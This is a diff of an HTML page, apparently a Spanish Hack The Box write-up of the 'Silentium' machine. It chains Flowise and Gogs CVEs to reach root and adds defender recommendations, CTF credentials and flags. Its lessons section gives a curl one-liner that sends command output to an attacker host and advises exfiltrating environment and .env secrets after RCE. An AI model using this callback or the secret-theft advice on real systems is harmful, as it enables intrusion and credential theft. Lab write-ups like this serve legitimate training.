-            <div class="rec-desc">CVE-2025-58434 y CVE-2025-59528 fueron corregidos en Flowise 3.0.6. El endpoint forgot-password no debe devolver el <code>tempToken</code> en la respuesta. El CustomMCP debe sanitizar la entrada antes de pasarla al constructor <code>Function()</code>.</div>
-          </div>
-        </div>
-        <div class="rec-box">
-          <div class="rec-icon">🐳</div>
-          <div>
-            <div class="rec-title">No reutilizar contraseñas entre contenedores y hosts</div>
-            <div class="rec-desc">Las variables de entorno de Docker son accesibles para cualquier proceso dentro del contenedor. Usar secretos de Docker (<code>docker secrets</code>) o un vault como HashiCorp Vault para credenciales sensibles.</div>
-          </div>
-        </div>
-        <div class="rec-box">
-          <div class="rec-icon">🔒</div>
-          <div>
-            <div class="rec-title">No ejecutar Gogs (ni ningún servicio) como root</div>
-            <div class="rec-desc">El archivo <code>app.ini</code> tenía <code>RUN_USER = root</code>. Crear un usuario dedicado de baja privilegio para ejecutar Gogs. Un RCE en el servicio no debe comprometer el sistema operativo completo.</div>
-          </div>
-        </div>
-        <div class="rec-box">
-          <div class="rec-icon">📡</div>
-          <div>
-            <div class="rec-title">Actualizar Gogs o migrar a Gitea</div>
-            <div class="rec-desc">Gogs 0.13.0 es vulnerable a CVE-2025-8110. Actualizar a la última versión disponible o considerar migrar a Gitea (fork activamente mantenido de Gogs) que tiene mejor historial de seguridad.</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- GLOSARIO -->
-      <div class="card">
-        <div class="card-title">Glosario Técnico</div>
-        <div class="glos-item">
-          <div class="glos-term">Flowise AI</div>
-          <div class="glos-def">Plataforma open-source para construir agentes de IA y flujos con LLMs de forma visual. Expone una API REST que permite interactuar con nodos de procesamiento. En su versión 3.0.5, contiene vulnerabilidades críticas de autenticación y RCE.</div>
-        </div>
-        <div class="glos-item">
-          <div class="glos-term">MCP (Model Context Protocol)</div>
-          <div class="glos-def">Protocolo estándar para conectar modelos de lenguaje con herramientas externas. El nodo CustomMCP en Flowise permite especificar configuraciones de servidores MCP — la vulnerabilidad está en que esta configuración se evalúa como código JavaScript.</div>
-        </div>
-        <div class="glos-item">
-          <div class="glos-term">Symlink Attack (Enlace Simbólico)</div>
-          <div class="glos-def">Técnica donde un atacante crea un enlace simbólico que apunta a un archivo sensible. Cuando una operación privilegiada sigue el enlace para leer/escribir, accidentalmente lee o sobreescribe el archivo objetivo en lugar del esperado.</div>
-        </div>
-        <div class="glos-item">
-          <div class="glos-term">sshCommand (git config)</div>
-          <div class="glos-def">Directiva de configuración de git que especifica qué comando usar como cliente SSH al conectarse a repositorios remotos via SSH. Permite inyección de comandos porque git ejecuta este valor directamente en el shell cuando realiza operaciones remotas.</div>
-        </div>
-        <div class="glos-item">
-          <div class="glos-term">ETXTBSY (Text file busy)</div>
-          <div class="glos-def">Error del kernel Linux que se produce cuando se intenta escribir en un ejecutable que está siendo usado activamente por algún proceso. Previene modificar binarios en ejecución, lo que protege la integridad del sistema pero también puede ser un obstáculo en ciertos ataques.</div>
-        </div>
-        <div class="glos-item">
-          <div class="glos-term">Virtual Hosting (nginx)</div>
-          <div class="glos-def">Técnica que permite a un servidor web servir múltiples sitios web desde la misma dirección IP, diferenciándolos por el nombre de dominio en el header HTTP Host. Común en CTFs para esconder aplicaciones adicionales bajo subdominios.</div>
-        </div>
-      </div>
-
-    </div><!-- end main column -->
-
-    <!-- SIDEBAR -->
-    <div>
-
-      <!-- MACHINE INFO -->
-      <div class="sidebar-card">
-        <div class="sidebar-title">Información de la Máquina</div>
-        <div class="info-row"><span class="info-label">Nombre</span><span class="info-val">Silentium</span></div>
-        <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val">Hack The Box</span></div>
-        <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val" style="color:var(--green);">Easy</span></div>
-        <div class="info-row"><span class="info-label">SO</span><span class="info-val">Linux (Ubuntu)</span></div>
-        <div class="info-row"><span class="info-label">IP</span><span class="info-val">10.129.27.58</span></div>
-        <div class="info-row"><span class="info-label">Fecha</span><span class="info-val">2026-04-12</span></div>
-        <div class="info-row"><span class="info-label">Puertos</span><span class="info-val">22, 80</span></div>
-      </div>
-
-      <!-- FLAGS -->
-      <div class="sidebar-card">
-        <div class="sidebar-title">Flags</div>
-        <div class="flag-box">
-          <div class="flag-label">User Flag</div>
-          <div class="flag-val">284c42dd13ced960cb1605b050ebcd09</div>
-        </div>
-        <div class="flag-box">
-          <div class="flag-label">Root Flag</div>
-          <div class="flag-val">bbc834baed5369d0353ac80b8d6b180e</div>
-        </div>
-      </div>
-
-      <!-- ATTACK CHAIN -->
-      <div class="sidebar-card">
-        <div class="sidebar-title">Cadena de Ataque</div>
-        <div class="chain-step"><div class="chain-dot"></div><div class="chain-text">Recon → silentium.htb + staging.silentium.htb</div></div>
-        <div class="chain-step"><div class="chain-dot"></div><div class="chain-text">CVE-2025-58434 → Password reset → cuenta admin Flowise</div></div>
-        <div class="chain-step"><div class="chain-dot"></div><div class="chain-text">API Key → CVE-2025-59528 CustomMCP RCE (root en Docker)</div></div>
-        <div class="chain-step"><div class="chain-dot"></div><div class="chain-text">Exfiltración → SMTP_PASSWORD → SSH como ben</div></div>
-        <div class="chain-step"><div class="chain-dot"></div><div class="chain-text">user.txt capturado</div></div>
-        <div class="chain-step"><div class="chain-dot"></div><div class="chain-text">Gogs 0.13.0 en 127.0.0.1:3001 (root)</div></div>
-        <div class="chain-step"><div class="chain-dot" style="background:var(--red)"></div><div class="chain-text">CVE-2025-8110 Symlink → root.txt</div></div>
-      </div>
-
-      <!-- CREDENCIALES -->
-      <div class="sidebar-card">
-        <div class="sidebar-title">Credenciales Encontradas</div>
-        <div class="cred-row">
-          <div class="cred-user">ben@silentium.htb (Flowise)</div>
-          <div class="cred-pass">H4ck3d123!</div>
-        </div>
-        <div class="cred-row">
-          <div class="cred-user">ben (SSH host)</div>
-          <div class="cred-pass">r04D!!_R4ge</div>
-        </div>
-        <div class="cred-row">
-          <div class="cred-user">FLOWISE_PASSWORD (env)</div>
-          <div class="cred-pass">F1l3_d0ck3r</div>
-        </div>
-        <div class="cred-row">
-          <div class="cred-user">pedro (Gogs)</div>
-          <div class="cred-pass">admin123</div>
-        </div>
-      </div>
-
-      <!-- CVEs -->
-      <div class="sidebar-card">
-        <div class="sidebar-title">CVEs Explotados</div>
-        <div style="margin-bottom:10px;">
-          <span class="cve-badge">CVE-2025-58434</span>
-          <div style="font-size:0.78rem; color:var(--text-dim); margin-top:4px;">Flowise — Unauth Password Reset</div>
-        </div>
-        <div style="margin-bottom:10px;">
-          <span class="cve-badge">CVE-2025-59528</span>
-          <div style="font-size:0.78rem; color:var(--text-dim); margin-top:4px;">Flowise — CustomMCP RCE</div>
-        </div>
-        <div>
-          <span class="cve-badge">CVE-2025-8110</span>
-          <div style="font-size:0.78rem; color:var(--text-dim); margin-top:4px;">Gogs — Symlink Race RCE</div>
-        </div>
-      </div>
-
-      <!-- TIMELINE -->
-      <div class="sidebar-card">
-        <div class="sidebar-title">Timeline</div>
-        <div class="timeline">
-          <div class="tl-item">
-            <div class="tl-dot"></div>
-            <div class="tl-time">T+0min</div>
-            <div class="tl-event">Nmap → 22, 80 — nginx redirige a silentium.htb</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot"></div>
-            <div class="tl-time">T+5min</div>
-            <div class="tl-event">Flowise 3.0.5 en staging.silentium.htb</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot"></div>
-            <div class="tl-time">T+10min</div>
-            <div class="tl-event">CVE-2025-58434 → tempToken → reset password → API key</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot"></div>
-            <div class="tl-time">T+20min</div>
-            <div class="tl-event">CVE-2025-59528 → RCE confirmado con sleep time-based</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot"></div>
-            <div class="tl-time">T+30min</div>
-            <div class="tl-event">Exfiltración env vars → SMTP_PASSWORD → SSH ben</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot"></div>
-            <div class="tl-time">T+35min</div>
-            <div class="tl-event">user.txt capturado</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot"></div>
-            <div class="tl-time">T+50min</div>
-            <div class="tl-event">Gogs 0.13.0 descubierto en puerto 3001</div>
-          </div>
-          <div class="tl-item">
-            <div class="tl-dot" style="background:var(--red)"></div>
-            <div class="tl-time">T+65min</div>
-            <div class="tl-event">CVE-2025-8110 → root shell → root.txt</div>
-          </div>
-        </div>
-      </div>
-
-    </div><!-- end sidebar -->
-  </div><!-- end grid -->
-</div><!-- end container -->
-
-<div class="footer">
-  <div>
-    <strong style="color:var(--accent);">Yoandy Ramírez</strong> — Offensive Security Portfolio
-  </div>
-  <div style="text-align:right;">
-    Silentium · HTB Easy · 2026-04-12<br>
-    <span style="color:var(--accent);">root@silentium</span> — PWNED
+root</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Shell root obtenida</strong>
+      <p>El exploit crea un repositorio, sube el symlink, sobreescribe el config con un <code>sshCommand</code> malicioso, y cuando Gogs procesa la operación, ejecuta el comando como root, enviando una reverse shell.</p>
+    </div>
   </div>
 </div>
+
+<!-- FASE 5: ROOT FLAG -->
+<div class="section">
+  <h2>Fase 5 — Root Flag</h2>
+
+  <div class="step-box">
+    <div class="step-number">Paso 8 — Root</div>
+    <h3>Captura de root.txt</h3>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="user-c">root@silentium:~#</span> <span class="cmd">cat</span> <span class="param">/root/root.txt</span></div>
+    </div>
+    <div class="output-box">
+      <div class="output-label">Output — ROOT OBTENIDO</div>
+      <pre>bbc834baed5369d0353ac80b8d6b180e</pre>
+    </div>
+    <div class="interpret-box">
+      <strong>Máquina comprometida completamente</strong>
+      <p>Cadena completa: unauthenticated password reset → API key → CustomMCP RCE en contenedor → exfiltración de credenciales → SSH → Gogs symlink RCE → root.</p>
+    </div>
+  </div>
+</div>
+
+<!-- LECCIONES -->
+<div class="section">
+  <h2>Lecciones Aprendidas</h2>
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>⚔ Para el Atacante</h4>
+      <ul>
+        <li><strong>Reutilización de credenciales</strong> — Siempre exfiltrar <code>env</code>, <code>printenv</code> y archivos <code>.env</code> desde cualquier RCE en contenedor.</li>
+        <li><strong>Callback HTTP cuando no hay reverse shell</strong> — <code>curl http://attacker/?d=$(cmd|base64 -w0)</code> es universal.</li>
+        <li><strong>Servicios internos = privesc</strong> — <code>ss -tlnp</code> reveló Gogs en <code>127.0.0.1:3001</code> como root.</li>
+        <li><strong>Tunneling SSH</strong> para acceder a servicios internos desde la máquina atacante.</li>
+      </ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡 Para el Defensor</h4>
+      <ul>
+        <li>Actualizar Flowise a versión 3.0.6+ (corrige CVE-2025-58434 y CVE-2025-59528).</li>
+        <li>No reutilizar contraseñas entre contenedores y hosts. Usar Docker secrets o HashiCorp Vault.</li>
+        <li>No ejecutar Gogs (ni ningún servicio) como root. Crear usuario dedicado.</li>
+        <li>Actualizar Gogs o migrar a Gitea (fork más mantenido).</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- MITRE -->
+<div class="section">
+  <h2>MITRE ATT&amp;CK</h2>
+  <table class="data-table">
+    <tr><th>ID</th><th>Técnica</th><th>Descripción en este ataque</th></tr>
+    <tr><td><code>T1046</code></td><td>Network Service Discovery</td><td>Nmap descubriendo SSH y HTTP</td></tr>
+    <tr><td><code>T1190</code></td><td>Exploit Public-Facing App</td><td>CVE-2025-58434 (Flowise password reset)</td></tr>
+    <tr><td><code>T1059.007</code></td><td>JavaScript Execution</td><td>CVE-2025-59528 (CustomMCP Function() injection)</td></tr>
+    <tr><td><code>T1552.001</code></td><td>Unsecured Credentials: Files</td><td>Variables de entorno del contenedor Docker</td></tr>
+    <tr><td><code>T1078</code></td><td>Valid Accounts</td><td>SSH con credenciales reutilizadas (ben)</td></tr>
+    <tr><td><code>T1068</code></td><td>Exploitation for Privilege Escalation</td><td>CVE-2025-8110 (Gogs symlink race)</td></tr>
+  </table>
+</div>
+
+<div class="flag-box">
+  <div class="flag-label">User Flag</div>
+  <div class="flag-value">284c42dd13ced960cb1605b050ebcd09</div>
+</div>
+
+<div class="flag-box">
+  <div class="flag-label">Root Flag</div>
+  <div class="flag-value">bbc834baed5369d0353ac80b8d6b180e</div>
+</div>
+
+</main>
+<aside class="sidebar">
+
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">Máquina</span><span class="meta-value">Silentium</span></div>
+    <div class="meta-row"><span class="meta-label">Plataforma</span><span class="meta-value">HackTheBox</span></div>
+    <div class="meta-row"><span class="meta-label">Dificultad</span><span class="meta-value" style="color:var(--green);">Easy</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Linux Ubuntu</span></div>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.129.26.220</span></div>
+    <div class="meta-row"><span class="meta-label">Puertos</span><span class="meta-value">22, 80</span></div>
+    <div class="meta-row"><span class="meta-label">Servicios</span><span class="meta-value">SSH, nginx 1.24.0</span></div>
+    <div class="meta-row"><span class="meta-label">CVEs</span><span class="meta-value" style="color:var(--red);">3 críticos</span></div>
+    <div class="meta-row"><span class="meta-label">Fecha</span><span class="meta-value">2026-04-12</span></div>
+    <div class="meta-row"><span class="meta-label">Tiempo</span><span class="meta-value">~65 min</span></div>
+    <div class="meta-row"><span class="meta-label">Pasos</span><span class="meta-value">8</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Herramientas Usadas</h4>
+    <div style="display:flex;flex-direction:column;gap:.4rem;">
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">nmap</span>
+        <span style="color:var(--text3);font-size:.75rem;">Port scan + scripts NSE</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">curl</span>
+        <span style="color:var(--text3);font-size:.75rem;">API requests + exfiltración</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">python3</span>
+        <span style="color:var(--text3);font-size:.75rem;">HTTP server + CVE exploit</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">ssh</span>
+        <span style="color:var(--text3);font-size:.75rem;">Acceso + tunneling</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">ss</span>
+        <span style="color:var(--text3);font-size:.75rem;">Enumeración de puertos internos</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;">
+        <span style="color:var(--green);font-family:var(--mo);font-size:.75rem;">nc</span>
+        <span style="color:var(--text3);font-size:.75rem;">Listener reverse shell</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Cadena de Ataque</h4>
+    <div style="display:flex;flex-direction:column;gap:.35rem;font-size:.75rem;">
+      <div style="background:#050e08;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text2);font-family:var(--mo);">1. nmap → 22, 80</div>
+      <div style="background:#050e08;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text2);font-family:var(--mo);">2. staging.silentium.htb → Flowise 3.0.5</div>
+      <div style="background:#050e08;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--red);color:var(--text2);font-family:var(--mo);">3. CVE-2025-58434 → password reset</div>
+      <div style="background:#050e08;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--red);color:var(--text2);font-family:var(--mo);">4. CVE-2025-59528 → RCE Docker</div>
+      <div style="background:#050e08;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--orange);color:var(--text2);font-family:var(--mo);">5. Exfiltrar env → SMTP_PASSWORD</div>
+      <div style="background:#050e08;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--green);color:var(--text2);font-family:var(--mo);">6. SSH ben → USER ✅</div>
+      <div style="background:#050e08;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--yellow);color:var(--text2);font-family:var(--mo);">7. Gogs 0.13.0 en 127.0.0.1:3001</div>
+      <div style="background:#050e08;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--red);color:var(--text2);font-family:var(--mo);">8. CVE-2025-8110 → ROOT ✅</div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Tabla de Contenidos</h4>
+    <div style="display:flex;flex-direction:column;gap:.3rem;">
+      <a href="#" style="display:flex;align-items:center;gap:.5rem;font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-radius:4px;border-left:2px solid var(--border);">Resumen Ejecutivo</a>
+      <a href="#" style="display:flex;align-items:center;gap:.5rem;font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-radius:4px;border-left:2px solid var(--border);">Vulnerabilidades</a>
+      <a href="#" style="display:flex;align-items:center;gap:.5rem;font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-radius:4px;border-left:2px solid var(--border);">Fase 1 — Reconocimiento</a>
+      <a href="#" style="display:flex;align-items:center;gap:.5rem;font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-radius:4px;border-left:2px solid var(--border);">Fase 2 — Explotación Flowise</a>
+      <a href="#" style="display:flex;align-items:center;gap:.5rem;font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-radius:4px;border-left:2px solid var(--border);">Fase 3 — User Flag</a>
+      <a href="#" style="display:flex;align-items:center;gap:.5rem;font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-radius:4px;border-left:2px solid var(--border);">Fase 4 — Privesc (Gogs)</a>
+      <a href="#" style="display:flex;align-items:center;gap:.5rem;font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-radius:4px;border-left:2px solid var(--border);">Lecciones</a>
+      <a href="#" style="display:flex;align-items:center;gap:.5rem;font-size:.78rem;color:var(--text2);padding:.25rem .5rem;border-radius:4px;border-left:2px solid var(--border);">MITRE ATT&CK</a>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1046</span>
+    <span class="mitre-tag">T1190</span>
+    <span class="mitre-tag">T1059.007</span>
+    <span class="mitre-tag">T1552.001</span>
+    <span class="mitre-tag">T1078</span>
+    <span class="mitre-tag">T1068</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>CVEs Explotados</h4>
+    <span class="cve-tag">CVE-2025-58434</span>
+    <span class="cve-tag">CVE-2025-59528</span>
+    <span class="cve-tag">CVE-2025-8110</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Credenciales</h4>
+    <div style="padding:.4rem 0;border-bottom:1px solid var(--border);font-size:.8rem;">
+      <span style="color:var(--text3);display:block;">ben@silentium.htb (Flowise)</span>
+      <span style="font-family:var(--mo);color:var(--green);font-size:.78rem;">H4ck3d123!</span>
+    </div>
+    <div style="padding:.4rem 0;border-bottom:1px solid var(--border);font-size:.8rem;">
+      <span style="color:var(--text3);display:block;">ben (SSH host)</span>
+      <span style="font-family:var(--mo);color:var(--green);font-size:.78rem;">r04D!!_R4ge</span>
+    </div>
+    <div style="padding:.4rem 0;border-bottom:1px solid var(--border);font-size:.8rem;">
+      <span style="color:var(--text3);display:block;">FLOWISE_PASSWORD (env)</span>
+      <span style="font-family:var(--mo);color:var(--green);font-size:.78rem;">F1l3_d0ck3r</span>
+    </div>
+    <div style="padding:.4rem 0;font-size:.8rem;">
+      <span style="color:var(--text3);display:block;">pedro (Gogs)</span>
+      <span style="font-family:var(--mo);color:var(--green);font-size:.78rem;">admin123</span>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Flags</h4>
+    <div style="background:rgba(96,165,250,.08);border:1px solid rgba(96,165,250,.2);border-radius:8px;padding:.9rem;text-align:center;margin-bottom:.75rem;">
+      <div style="font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;">user.txt</div>
+      <div style="font-family:var(--mo);font-size:.68rem;color:var(--blue);word-break:break-all;font-weight:700;">284c42dd13ced960cb1605b050ebcd09</div>
+    </div>
+    <div style="background:rgba(0,232,122,.08);border:1px solid rgba(0,232,122,.2);border-radius:8px;padding:.9rem;text-align:center;">
+      <div style="font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;">root.txt</div>
+      <div style="font-family:var(--mo);font-size:.68rem;color:var(--green);word-break:break-all;font-weight:700;">bbc834baed5369d0353ac80b8d6b180e</div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Glosario</h4>
+    <div class="glosario-item">
+      <span class="glosario-term">Flowise AI</span>
+      <span class="glosario-def">Plataforma open-source para construir agentes de IA con LLMs. Versión 3.0.5 vulnerable a autenticación bypass y RCE.</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">MCP (Model Context Protocol)</span>
+      <span class="glosario-def">Protocolo para conectar LLMs con herramientas externas. El nodo CustomMCP evalúa la configuración como código JavaScript.</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">Symlink Attack</span>
+      <span class="glosario-def">Técnica donde un enlace simbólico apunta a un archivo sensible. Operaciones privilegiadas que siguen el enlace acceden al archivo objetivo.</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">Virtual Hosting</span>
+      <span class="glosario-def">Técnica que permite servir múltiples sitios desde la misma IP, diferenciando por el header HTTP Host.</span>
+    </div>
+  </div>
+
+</aside>
+</div>
+
+<div style="margin-top:60px;padding:30px 40px;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;color:var(--text3);font-size:.8rem;max-width:1200px;margin-left:auto;margin-right:auto;">
+  <div>© Yoandy Ramírez Delgado · <strong style="color:var(--green);">Heindall</strong> — Offensive Security Portfolio</div>
+  <div style="text-align:right;">Silentium · HTB Easy · 2026-04-12</div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function(){
+  const c=document.getElementById('heroOrb');if(!c)return;
+  const w=260,h=260;
+  const r=new THREE.WebGLRenderer({canvas:c,alpha:true,antialias:true});
+  r.setSize(w,h);r.setPixelRatio(Math.min(window.devicePixelRatio,2));
+  const s=new THREE.Scene(),cam=new THREE.PerspectiveCamera(45,1,.1,100);
+  cam.position.z=4;
+  const geo=new THREE.IcosahedronGeometry(1.3,1);
+  const mat=new THREE.MeshBasicMaterial({color:0x00e87a,wireframe:true,transparent:true,opacity:.35});
+  const mesh=new THREE.Mesh(geo,mat);s.add(mesh);
+  const g2=new THREE.IcosahedronGeometry(1.0,0);
+  const m2=new THREE.MeshBasicMaterial({color:0x00e87a,wireframe:true,transparent:true,opacity:.12});
+  const mesh2=new THREE.Mesh(g2,m2);s.add(mesh2);
+  (function animate(){requestAnimationFrame(animate);mesh.rotation.x+=.003;mesh.rotation.y+=.005;mesh2.rotation.x-=.002;mesh2.rotation.y-=.004;r.render(s,cam);})();
+})();
+</script>
 
 </body>
 </html>
